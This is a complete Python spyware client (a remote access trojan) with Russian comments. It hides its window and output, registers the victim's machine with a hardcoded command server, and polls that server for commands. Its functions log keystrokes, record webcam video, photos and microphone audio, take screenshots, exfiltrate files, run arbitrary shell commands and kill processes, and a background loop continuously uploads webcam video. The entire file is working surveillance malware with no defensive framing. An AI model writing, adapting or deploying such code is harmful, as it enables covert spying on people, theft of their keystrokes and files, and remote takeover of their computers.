#!/usr/bin/env python3
import cv2
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
from pynput import keyboard
import threading
import requests
import time
import os
import tempfile
import getpass
import socket
import platform
import subprocess
import sys
import json
import base64
from datetime import datetime
import mss
import mss.tools
import pyautogui
import psutil
import shutil

# ========== КОНФИГУРАЦИЯ ==========
COMMAND_SERVER = "http://192.168.1.58:5000"  # IP твоего сервера
CHECK_INTERVAL = 10  # проверка команд каждые 10 секунд
VIDEO_DURATION = 30  # длительность видео в секундах
# ===================================

# Скрываем окно (для Windows)
if platform.system() == "Windows":
    import win32gui
    import win32con

    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except:
        pass


class SpyModule:
    def __init__(self):
        self.device_id = self.get_device_id()
        self.commands = []
        self.running = True
        self.keylog_data = ""

    def get_device_id(self):
        """Уникальный ID устройства"""
        try:
            # Комбинируем имя хоста и MAC-адрес для уникальности
            hostname = socket.gethostname()
            mac = self.get_mac_address()
            return f"{hostname}_{mac[-8:]}"
        except:
            return f"{socket.gethostname()}_{int(time.time())}"

    def get_mac_address(self):
        """Получение MAC-адреса"""
        try:
            import uuid
            return hex(uuid.getnode())[2:]
        except:
            return "unknown"

    def register_device(self):
        """Регистрация устройства на сервере"""
        try:
            system_info = self.get_system_info()
            data = {
                "type": "register",
                "device_id": self.device_id,
                "system_info": system_info
            }
            requests.post(f"{COMMAND_SERVER}/api/device", json=data, timeout=5)
            print(f"✅ Устройство зарегистрировано: {self.device_id}")
        except Exception as e:
            print(f"❌ Ошибка регистрации: {e}")

    def get_system_info(self):
        """Полная информация о системе"""
        info = {
            "timestamp": str(datetime.now()),
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": getpass.getuser(),
            "device_id": self.device_id,
            "ram_total": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "ram_available": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            "cpu_count": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "disk_usage": {},
            "network_interfaces": [],
            "installed_software": self.get_installed_software(),
            "running_processes": self.get_running_processes()
        }

        # Информация о дисках
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info["disk_usage"][partition.device] = {
                    "total": round(usage.total / (1024 ** 3), 2),
                    "used": round(usage.used / (1024 ** 3), 2),
                    "free": round(usage.free / (1024 ** 3), 2),
                    "percent": usage.percent
                }
            except:
                pass

        # Сетевые интерфейсы
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info["network_interfaces"].append({
                        "interface": interface,
                        "ip": addr.address,
                        "netmask": addr.netmask
                    })

        return info

    def get_installed_software(self):
        """Список установленного ПО"""
        software = []
        if platform.system() == "Windows":
            try:
                import winreg
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    software.append(name)
                                except:
                                    pass
                        except:
                            pass
            except:
                pass
        else:  # macOS/Linux
            try:
                if platform.system() == "Darwin":  # macOS
                    result = subprocess.run(['ls', '/Applications'], capture_output=True, text=True)
                    software = result.stdout.split('\n')
                else:  # Linux
                    result = subprocess.run(['dpkg-query', '-W', '-f=${Package}\n'],
                                            capture_output=True, text=True)
                    software = result.stdout.split('\n')
            except:
                pass
        return software[:50]  # Ограничим количество

    def get_running_processes(self):
        """Список запущенных процессов"""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        return processes[:30]  # Топ-30 процессов

    def check_commands(self):
        """Проверка команд с сервера"""
        try:
            response = requests.get(f"{COMMAND_SERVER}/api/commands/{self.device_id}", timeout=5)
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for cmd in commands:
                    self.execute_command(cmd)
        except Exception as e:
            print(f"❌ Ошибка проверки команд: {e}")

    def execute_command(self, command):
        """Выполнение команд с сервера"""
        cmd_type = command.get('type')
        cmd_id = command.get('id')
        params = command.get('params', {})

        print(f"⚡ Выполнение команды: {cmd_type}")

        result = {
            "command_id": cmd_id,
            "type": cmd_type,
            "status": "success",
            "timestamp": str(datetime.now()),
            "data": None
        }

        try:
            if cmd_type == "record_video":
                result["data"] = self.record_video(params.get('duration', VIDEO_DURATION))

            elif cmd_type == "screenshot":
                result["data"] = self.take_screenshot()

            elif cmd_type == "record_audio":
                result["data"] = self.record_audio(params.get('duration', 10))

            elif cmd_type == "webcam_photo":
                result["data"] = self.take_webcam_photo()

            elif cmd_type == "system_info":
                result["data"] = self.get_system_info()

            elif cmd_type == "keylog_dump":
                result["data"] = self.keylog_data
                self.keylog_data = ""

            elif cmd_type == "download_file":
                filepath = params.get('path')
                if filepath and os.path.exists(filepath):
                    result["data"] = self.read_file_base64(filepath)
                else:
                    result["status"] = "error"
                    result["error"] = "File not found"

            elif cmd_type == "run_command":
                shell_cmd = params.get('command')
                if shell_cmd:
                    output = subprocess.run(shell_cmd, shell=True,
                                            capture_output=True, text=True)
                    result["data"] = {
                        "stdout": output.stdout,
                        "stderr": output.stderr,
                        "returncode": output.returncode
                    }

            elif cmd_type == "list_directory":
                path = params.get('path', '.')
                if os.path.exists(path):
                    result["data"] = os.listdir(path)
                else:
                    result["status"] = "error"
                    result["error"] = "Path not found"

            elif cmd_type == "get_processes":
                result["data"] = self.get_running_processes()

            elif cmd_type == "kill_process":
                pid = params.get('pid')
                if pid:
                    try:
                        proc = psutil.Process(pid)
                        proc.terminate()
                        result["data"] = f"Process {pid} terminated"
                    except Exception as e:
                        result["status"] = "error"
                        result["error"] = str(e)

            elif cmd_type == "self_destruct":
                self.running = False
                result["data"] = "Self destruct initiated"
                # Здесь можно добавить удаление файлов

            else:
                result["status"] = "error"
                result["error"] = f"Unknown command: {cmd_type}"

        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)

        # Отправляем результат
        self.send_command_result(result)

    def record_video(self, duration=30):
        """Запись видео с веб-камеры"""
        try:
            cap = cv2.VideoCapture(0)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 15)

            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            temp_file = tempfile.NamedTemporaryFile(suffix='.mp4', delete=False)
            out = cv2.VideoWriter(temp_file.name, fourcc, 15, (640, 480))

            start_time = time.time()
            while time.time() - start_time < duration:
                ret, frame = cap.read()
                if ret:
                    # Добавляем метку времени
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    cv2.putText(frame, timestamp, (10, 30),
                                cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                    out.write(frame)
                else:
                    break

            cap.release()
            out.release()

            return self.read_file_base64(temp_file.name)
        except Exception as e:
            raise e

    def take_screenshot(self):
        """Скриншот экрана"""
        try:
            with mss.mss() as sct:
                filename = tempfile.NamedTemporaryFile(suffix='.png', delete=False).name
                sct.shot(output=filename)
                return self.read_file_base64(filename)
        except:
            try:
                # Fallback на pyautogui
                screenshot = pyautogui.screenshot()
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                screenshot.save(temp_file.name)
                return self.read_file_base64(temp_file.name)
            except:
                raise

    def record_audio(self, duration=10):
        """Запись с микрофона"""
        try:
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate),
                               samplerate=sample_rate,
                               channels=1,
                               dtype='int16')
            sd.wait()

            temp_file = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
            write(temp_file.name, sample_rate, recording)

            return self.read_file_base64(temp_file.name)
        except Exception as e:
            raise e

    def take_webcam_photo(self):
        """Фото с веб-камеры"""
        try:
            cap = cv2.VideoCapture(0)
            time.sleep(1)  # Даем камере прогреться
            ret, frame = cap.read()
            cap.release()

            if ret:
                temp_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
                cv2.imwrite(temp_file.name, frame)
                return self.read_file_base64(temp_file.name)
            else:
                raise Exception("Failed to capture image")
        except Exception as e:
            raise e

    def read_file_base64(self, filepath):
        """Чтение файла и кодирование в base64"""
        with open(filepath, 'rb') as f:
            data = base64.b64encode(f.read()).decode('utf-8')
        os.unlink(filepath)  # Удаляем временный файл
        return data

    def send_command_result(self, result):
        """Отправка результата команды"""
        try:
            requests.post(f"{COMMAND_SERVER}/api/result/{self.device_id}",
                          json=result, timeout=10)
        except Exception as e:
            print(f"❌ Ошибка отправки результата: {e}")

    def keylogger_callback(self, key):
        """Callback для кейлоггера"""
        try:
            self.keylog_data += str(key.char)
        except AttributeError:
            self.keylog_data += f" [{key}] "

    def start_keylogger(self):
        """Запуск кейлоггера в отдельном потоке"""
        try:
            with keyboard.Listener(on_press=self.keylogger_callback) as listener:
                listener.join()
        except:
            pass

    def auto_record(self):
        """Автоматическая запись каждые 30 секунд"""
        while self.running:
            # Записываем видео
            try:
                video_data = self.record_video(VIDEO_DURATION)
                requests.post(f"{COMMAND_SERVER}/api/auto/{self.device_id}",
                              json={
                                  "type": "video",
                                  "timestamp": str(datetime.now()),
                                  "data": video_data
                              }, timeout=10)
            except:
                pass

            # Пауза перед следующей записью
            for _ in range(30):  # Проверяем команды каждые 10 сек во время паузы
                if not self.running:
                    break
                self.check_commands()
                time.sleep(1)

    def run(self):
        """Основной цикл программы"""
        # Регистрируем устройство
        self.register_device()

        # Запускаем кейлоггер в фоне
        kl_thread = threading.Thread(target=self.start_keylogger)
        kl_thread.daemon = True
        kl_thread.start()

        # Запускаем автоматическую запись в фоне
        record_thread = threading.Thread(target=self.auto_record)
        record_thread.daemon = True
        record_thread.start()

        # Основной цикл проверки команд
        while self.running:
            self.check_commands()

            # Отправляем периодические пинги
            if int(time.time()) % 60 == 0:  # Каждую минуту
                try:
                    requests.post(f"{COMMAND_SERVER}/api/ping/{self.device_id}",
                                  json={"timestamp": str(datetime.now())}, timeout=3)
                except:
                    pass

            time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    # Скрываем вывод на продакшене
    if len(sys.argv) > 1 and sys.argv[1] == "--debug":
        spy = SpyModule()
        spy.run()
    else:
        # Перенаправляем stdout/stderr в DEVNULL
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        spy = SpyModule()
        spy.run()